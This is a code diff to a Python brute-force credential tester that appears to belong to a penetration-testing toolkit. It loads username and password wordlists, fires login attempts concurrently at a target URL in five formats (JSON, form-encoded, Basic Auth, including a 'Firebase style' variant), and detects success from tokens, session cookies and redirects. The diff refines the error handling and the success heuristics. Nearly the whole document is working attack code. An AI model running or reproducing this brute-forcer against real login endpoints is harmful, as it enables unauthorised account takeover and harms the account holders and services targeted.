@@ -2,11 +2,12 @@ import asyncio
 import sys
 from typing import List, Dict, Optional, Tuple, Set
 from core.base_module import BaseModule, Finding
-from pathlib
+from pathlib import Path
 import json
 import urllib.request
 import urllib.error
 import urllib.parse
+import base64
 
 
 class CredentialTester(BaseModule):
@@ -55,10 +56,10 @@ class CredentialTester(BaseModule):
         print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
         print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")
 
-        # Create endpoint dict with target URL - no form detection
+        # Create endpoint dict with target URL - no form detection, just brute force
         endpoint = {
             'url': target_url,
-            'form_type': 'auto',  # Will try multiple payload formats
+            'form_type': 'auto',
             'fields': {
                 'username_fields': ['email', 'username', 'user', 'login', 'name'],
                 'password_field': 'password'
@@ -140,7 +141,6 @@ class CredentialTester(BaseModule):
 
     async def _test_brute_force(self, endpoint: Dict):
         import itertools
-        import base64
 
         url = endpoint['url']
         base_usernames, passwords = self._load_wordlists()
@@ -151,10 +151,6 @@ class CredentialTester(BaseModule):
         found_event = asyncio.Event()
         rate_limited = [False]
         counter = [0]
-
-        # Common username field names to try
-        username_fields = ['email', 'username', 'user', 'login', 'name', 'id']
-        password_field = 'password'
 
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
@@ -170,10 +166,9 @@ class CredentialTester(BaseModule):
                     loop = asyncio.get_event_loop()
 
                     def do_request():
-                        # Try multiple payload formats simultaneously
-                        last_error = None
+                        # Try multiple payload formats - return on first non-400 response
                         
-                        # Format 1: JSON (email/password)
+                        # Format 1: JSON (email/password) - Firebase style
                         try:
                             body = json.dumps({
                                 'email': username,
@@ -189,12 +184,10 @@ class CredentialTester(BaseModule):
                             with urllib.request.urlopen(req, timeout=10) as r:
                                 return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
                         except urllib.error.HTTPError as e:
-                            if e.code == 400:
-                                last_error = (e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email')
-                            else:
+                            if e.code not in [400, 401, 403, 404]:
                                 return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
-                        except Exception as e:
-                            last_error = str(e)
+                        except Exception:
+                            pass
 
                         # Format 2: JSON (username/password)
                         try:
@@ -211,12 +204,10 @@ class CredentialTester(BaseModule):
                             with urllib.request.urlopen(req, timeout=10) as r:
                                 return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
                         except urllib.error.HTTPError as e:
-                            if e.code == 400:
-                                last_error = (e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user')
-                            else:
+                            if e.code not in [400, 401, 403, 404]:
                                 return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
-                        except Exception as e:
-                            last_error = str(e)
+                        except Exception:
+                            pass
 
                         # Format 3: Form URL encoded (email/password)
                         try:
@@ -233,12 +224,10 @@ class CredentialTester(BaseModule):
                             with urllib.request.urlopen(req, timeout=10) as r:
                                 return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
                         except urllib.error.HTTPError as e:
-                            if e.code == 400:
-                                last_error = (e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email')
-                            else:
+                            if e.code not in [400, 401, 403, 404]:
                                 return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
-                        except Exception as e:
-                            last_error = str(e)
+                        except Exception:
+                            pass
 
                         # Format 4: Form URL encoded (username/password)
                         try:
@@ -255,12 +244,10 @@ class CredentialTester(BaseModule):
                             with urllib.request.urlopen(req, timeout=10) as r:
                                 return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
                         except urllib.error.HTTPError as e:
-                            if e.code == 400:
-                                last_error = (e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user')
-                            else:
+                            if e.code not in [400, 401, 403, 404]:
                                 return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
-                        except Exception as e:
-                            last_error = str(e)
+                        except Exception:
+                            pass
 
                         # Format 5: Basic Auth
                         try:
@@ -276,17 +263,11 @@ class CredentialTester(BaseModule):
                             with urllib.request.urlopen(req, timeout=10) as r:
                                 return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'basic_auth'
                         except urllib.error.HTTPError as e:
-                            if e.code == 401:
-                                last_error = (e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'basic_auth')
-                            else:
-                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'basic_auth'
+                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'basic_auth'
                         except Exception as e:
-                            last_error = str(e)
+                            return 0, str(e), {}, 'unknown'
 
-                        # Return last error if all failed
-                        if isinstance(last_error, tuple):
-                            return last_error
-                        return 0, str(last_error), {}, 'unknown'
+                        return 0, 'All formats failed', {}, 'unknown'
 
                     status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                     tl = text.lower()
@@ -305,51 +286,44 @@ class CredentialTester(BaseModule):
                         found_event.set()
                         return
 
-                    # Success detection - generic checks that work for most auth systems
+                    # Success detection
                     is_success = False
 
-                    # Check for tokens/session indicators in response
-                    if any(k in tl for k in ['idtoken', 'id_token', 'access_token', 'auth_token', 'token', 'sessionid', 'session_id', 'jwt']):
-                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'incorrect', 'denied', 'unauthorized']):
+                    # Check for auth tokens in response
+                    if any(k in tl for k in ['idtoken', 'id_token', 'access_token', 'auth_token', 'token', 'sessionid', 'session_id', 'jwt', 'refresh_token']):
+                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'incorrect', 'denied', 'unauthorized', 'null']):
                             is_success = True
 
-                    # Check for successful HTTP status with auth indicators
+                    # Check for successful HTTP status with positive indicators
                     if status in [200, 201, 202]:
-                        # Check for error messages
-                        error_indicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again', 'not found']
+                        error_indicators = ['invalid', 'incorrect', 'failed', 'error', 'wrong', 'denied', 'unauthorized', 'try again', 'not found', 'false']
                         if not any(err in tl for err in error_indicators):
-                            # Check for success indicators
-                            success_indicators = ['welcome', 'dashboard', 'success', 'logged in', 'authenticated', 'profile', 'home', 'admin', 'redirect']
+                            success_indicators = ['welcome', 'dashboard', 'success', 'logged in', 'authenticated', 'profile', 'home', 'admin', 'redirect', 'token', 'idtoken']
                             if any(succ in tl for succ in success_indicators):
                                 is_success = True
-                            # Check for auth cookies
                             cookies = str(resp_headers.get('Set-Cookie', '')).lower()
-                            if any(c in cookies for c in ['session', 'token', 'auth', 'jwt', 'sid']):
+                            if any(c in cookies for c in ['session', 'token', 'auth', 'jwt', 'sid', 'uid']):
                                 is_success = True
 
-                    # Redirect to dashboard/home indicates success
+                    # Redirect to non-login page indicates success
                     if status in [301, 302, 303, 307, 308]:
                         location = resp_headers.get('Location', '').lower()
-                        if any(p in location for p in ['dashboard', 'admin', 'home', 'profile', 'welcome', 'panel', 'main', 'success']):
+                        if location and not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
                             is_success = True
-                        # If redirect doesn't go back to login, might be success
-                        if not any(p in location for p in ['login', 'signin', 'error', 'fail', 'denied', 'auth']):
-                            if 'http' in location or location.startswith('/'):
-                                is_success = True
 
-                    # Basic auth 200 is success
+                    # 200 OK on Basic Auth is success
                     if used_format == 'basic_auth' and status == 200:
                         is_success = True
 
                     if is_success:
                         sys.stdout.write('\n')
                         self._report_success(username, password, url, counter[0],
-                                             [used_format], password_field)
+                                             [used_format], 'password')
                         found_event.set()
 
                 except asyncio.CancelledError:
                     raise
-                except Exception as e:
+                except Exception:
                     counter[0] += 1
 
         tasks = [asyncio.create_task(attempt(u, p))
